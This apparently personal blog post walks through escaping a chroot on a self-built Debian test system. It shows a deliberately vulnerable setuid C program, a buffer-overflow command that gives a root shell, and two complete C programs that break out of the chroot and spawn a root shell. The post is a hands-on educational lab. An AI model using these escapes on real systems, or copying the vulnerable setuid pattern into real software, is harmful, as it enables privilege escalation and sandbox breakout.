+++
title = "On Escaping a Chroot"
date = "2019-05-18T21:54:25-04:00"

+++

> This post builds upon some topics that I've previously covered, specifically bits of [On Running a Tor Onion Service in a Chroot] and [On Stack Smashing, Part Two].

For years I've heard how a [chroot] isn't secure and is trivial to escape.  However, I never looked into it until recently.

<blockquote>
<p>Note that I&rsquo;m not speaking of <a href="https://en.wikipedia.org/wiki/FreeBSD_jail">BSD jails</a> or <a href="https://en.wikipedia.org/wiki/LXC">Linux containers</a>, which are much more secure.</p>
</blockquote>

<p>For an escape to be successful, there needs to be a way for an unprivileged user to become a privileged user.  The most frequently cited method, and the one I&rsquo;ll demonstrate here, is to exploit a <a href="https://en.wikipedia.org/wiki/Setuid">setuid</a> binary.</p>

<p>Once the <code>setuid</code> binary has been exploited and the user has a root shell, escaping from the <code>chroot</code> is like taking candy from a baby.</p>

<p>Let&rsquo;s dig in.</p>

<h2 id="create-a-chroot">Create a <code>chroot</code></h2>

<p>My preferred way to create a <code>chroot</code>, as I&rsquo;ve written about before, is to use the <a href="https://linux.die.net/man/8/debootstrap"><code>debootstrap</code></a> tool.  Since I&rsquo;ve already documented how to do this, I&rsquo;ll just list the commands and not go into any detail.  See the posts linked at the top of this post for more information.</p>

<p>To create a <code>chroot</code>, simply do the following:</p>

<pre><code>$ sudo -i
# debootstrap --include=build-essential,gdb,vim \
    --arch=i386 stretch /srv/chroot/32 http://ftp.debian.org/debian
# cat &gt; /etc/schroot/chroot.d/32
[32]
description=Debian stretch i386
type=directory
directory=/srv/chroot/32
users=btoll
root-users=btoll
root-groups=root
# exit
$ schroot -u btoll -c 32
</code></pre>

<p>We have now created a Debian system located at <code>/srv/chroot/32</code> and use the <a href="https://linux.die.net/man/1/schroot"><code>schroot</code></a> tool to run a login shell inside the environment.</p>

<h2 id="exploitation">Exploitation</h2>

<p>Again, I&rsquo;m not going to go into any detail here because I did at great length in <code>On Stack Smashing</code>, parts <a href="/2019/04/09/on-stack-smashing-part-one/">one</a> and <a href="/2019/04/10/on-stack-smashing-part-two/">two</a>.  Here is the program that we&rsquo;ll exploit:</p>

<p><code>cat_pictures.c</code></p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void foo(char *s) {
    char buf[10];
    strcpy(buf, s); 
    printf(&quot;%s\n&quot;, buf);
}

int main(int argc, char **argv) {
    foo(argv[1]);
    return 0;
}
</code></pre>

<p>Compile and set as <code>suid</code>:</p>

<pre><code># gcc -o cat_pictures -ggdb3 -z execstack cat_pictures.c
# chmod 4550 cat_pictures
</code></pre>

<p>Now, the exploitation itself:</p>

<pre><code>$ ./cat_pictures $(perl -e 'print &quot;A&quot;x22 . &quot;\xc7\xdd\xff\xff&quot;')

# whoami
root
# id
uid=0(root) gid=1001(test) groups=1001(test)
#
</code></pre>

<p>We have a root shell after injecting the shellcode.  We&rsquo;re now ready to break out of the <code>chroot</code>.</p>

<h2 id="escaping-a-chroot">Escaping a <code>chroot</code></h2>

<p>Since we&rsquo;re <code>root</code> after successfully executing the exploit in the last section, we&rsquo;re now free to code another exploit to break out of the <code>chroot</code>.</p>

<p>Conceptually, the idea is to create another directory that we will <code>chroot</code> from our current working directory.  Once that is done, we&rsquo;ll use the <code>chdir</code> system call (syscall) to move up to the root of the filesystem, at which point we&rsquo;ll create a root shell.  <a href="https://www.youtube.com/watch?v=U-xetxYwyak">Sweet freedom</a>!</p>

<p>Why does this work?  Since the default the <code>chroot</code> syscall does not change the directory to that which was specifiied in the <code>chroot</code> syscall, the current working directory remains outside of the new <code>chroot</code>.  This is the key.  Then, since <code>chroot</code>s aren&rsquo;t nested, we simply recurse up to the real <code>/</code> of the file system.</p>

<h3 id="when-cwd-is-not-changed">When <code>cwd</code> Is Not Changed</h3>

<p>Depending upon the operating system, the current working directory (<code>cwd</code>) may or may not be changed to the new location specified by the path argument to the <code>chroot</code> syscall.  When it is not, the way to escape the jail is more straightforward than otherwise.</p>

<p>From the <a href="http://man7.org/linux/man-pages/man2/chroot.2.html"><code>chroot</code> man page</a>:</p>

<pre>
This  call  does not change the current working directory, so that after the call '.'
can be outside the tree rooted at '/'.  In particular, the superuser can escape  from
a "chroot jail" by doing:

   mkdir foo; chroot foo; cd ..
</pre>

<p>Let&rsquo;s first look at when the <code>cwd</code> is not changed by the <code>chroot</code> syscall.  Here&rsquo;s one implementation:</p>

<pre><code>#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;

void move_to_root() {
    for (int i = 0; i &lt; 1024; ++i)
        chdir(&quot;..&quot;);
}

int main() {
    mkdir(&quot;.futz&quot;, 0755);
    chroot(&quot;.futz&quot;);
    move_to_root();
    chroot(&quot;.&quot;);
    return execl(&quot;/bin/sh&quot;, &quot;-i&quot;, NULL);
}
</code></pre>

<p>The most important bit of this code is that my OS isn&rsquo;t changing the <code>cwd</code> (I know this through experimentation) and we <strong>are not</strong> <code>cd</code>ing into the new <code>.futz</code> directory before we invoke the <code>chroot</code> system call wrapper.  Again, this ensures that our current working directory (<code>cwd</code>) is outside of this new <code>chroot</code>.  Conversely, if we were to do also to make the new <code>chroot</code> the <code>cwd</code>, then it would not be possible to escape from the <code>chroot</code> using this particular implementation.</p>

<blockquote>
<p>Sadly, we just can&rsquo;t recurse of the file system tree without creating a new <code>chroot</code>.  Without doing so, the kernel will just recurse up the root of the <code>chroot</code>, eventually expanding <code>..</code> to <code>.</code> for the remaining path, if any.  In other words, this will not work:</p>

<pre><code>  chroot(&quot;../../../../../../../../&quot;);
</code></pre>
</blockquote>

<p>The <code>move_to_root</code> function loops an arbitrary number of times to recurse up to the root directory.  Chances are fairly good that the <code>chroot</code> is nowhere that deeply nested on the machine, and once in the root of the filesystem tree (<code>/</code>), the files <code>..</code> and <code>.</code> mean the same thing.  In other words, once in the root directory <code>..</code> doesn&rsquo;t do anything.</p>

<p>Now that we&rsquo;re that we&rsquo;ve broken out of the <code>chroot</code>, the last steps are to set the current (root) directory as the new <code>chroot</code> and then do something useful like launch a root shell.</p>

<h3 id="when-cwd-is-changed">When <code>cwd</code> Is Changed</h3>

<p>Be aware that some kernels will change the <code>cwd</code> to be inside the <code>chroot</code> when calling <code>chroot</code>, which makes it impossible to escape the <code>chroot</code> environment by <code>chroot</code>ing to a another directory.  If this is the case, there is an alternative way to break out of the <code>chroot</code> using the file descriptor of the <code>cwd</code> <em>before</em> the <code>chroot</code> system call.</p>

<p>Again, from the <a href="http://man7.org/linux/man-pages/man2/chroot.2.html"><code>chroot</code> man page</a>:</p>

<pre>
This  call  does not close open file descriptors, and such file descriptors may allow
access to files outside the chroot tree.
</pre>

<p>Since the key in this scenario is to store the file descriptor of a directory outside of the soon-to-be <code>chroot</code> before <code>chroot</code>ing, we store the result of the <a href="http://man7.org/linux/man-pages/man2/open.2.html"><code>open</code> syscall</a> to the <code>cwd</code>, which will be a file descriptor.</p>

<p>Then, we escape the new <code>chroot</code> by way of passing the file descriptor to the <a href="https://linux.die.net/man/2/fchdir"><code>fchdir</code> syscall</a>:</p>

<pre><code>fd = open(&quot;.&quot;, O_RDONLY);
chroot(&quot;.futz&quot;);
fchdir(fd);
</code></pre>

<p>An full example of this could look like the following:</p>

<pre><code>#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;

void move_to_root() {
    for (int i = 0; i &lt; 1024; ++i)
        chdir(&quot;..&quot;);
}

int main() {
    int fd;
    mkdir(&quot;.futz&quot;, 0755);
    fd = open(&quot;.&quot;, O_RDONLY);
    chroot(&quot;.futz&quot;);
    fchdir(fd);
    close(fd);
    move_to_root();
    chroot(&quot;.&quot;);
    return execl(&quot;/bin/sh&quot;, &quot;-i&quot;, NULL);
}
</code></pre>

<h3 id="testing">Testing</h3>

<p>Finally, it can be useful to log out the <code>cwd</code> before and after the <code>chroot</code> syscall to determine if the kernel is also changing the directory to the new <code>chroot</code>:</p>

<pre><code>#define PATH_MAX 200

void cwd() {
    char dir[PATH_MAX};
    printf(&quot;cwd is %s\n&quot;, getcwd(dir, PATH_MAX);
}
</code></pre>

<p>For example, on my Debian 9 install, I insert calls to <code>cwd()</code> before and after the <code>chroot</code> syscall:</p>

<pre><code>// Inside function body...
cwd();
chroot(&quot;.futz&quot;);
cwd();
</code></pre>

<p>And the following is printed to <code>stdout</code>:</p>

<pre><code>cwd is /root
cwd is (null)
</code></pre>

<p>This means the kernel did not change the <code>cwd</code>, for we see that the <code>chroot</code> is unable to &ldquo;see&rdquo; it.</p>

<p>Conversely, if I insert a call to <code>chdir</code> directly after the <code>chroot</code> syscall:</p>

<pre><code>// Inside function body...
cwd();
chroot(&quot;.futz&quot;);
chdir(&quot;.futz&quot;);
cwd();
</code></pre>

<p>The following is printed:</p>

<pre><code>cwd is /root
cwd is /
</code></pre>

<p>Since the <code>cwd</code> is inside our new <code>chroot</code>, we can&rsquo;t break out unless we captured an open file descriptor before <code>chroot</code>ing!</p>

<h2 id="references">References</h2>

<ul>
<li><a href="http://unixwiz.net/techtips/mirror/chroot-break.html">How to Break Out of a chroot() Jail</a></li>
<li><a href="http://unixwiz.net/techtips/chroot-practices.html">Best Practices for UNIX chroot() Operations</a></li>
<li><a href="https://filippo.io/escaping-a-chroot-jail-slash-1/">Escaping a chroot jail</a></li>
<li><a href="https://github.com/earthquake/chw00t">chw00t: chroot escape tool</a></li>
</ul>

[On Running a Tor Onion Service in a Chroot]: /2018/04/06/on-running-a-tor-onion-service-in-a-chroot/
[On Stack Smashing, Part Two]: /2019/04/10/on-stack-smashing-part-two/
[chroot]: https://en.wikipedia.org/wiki/Chroot

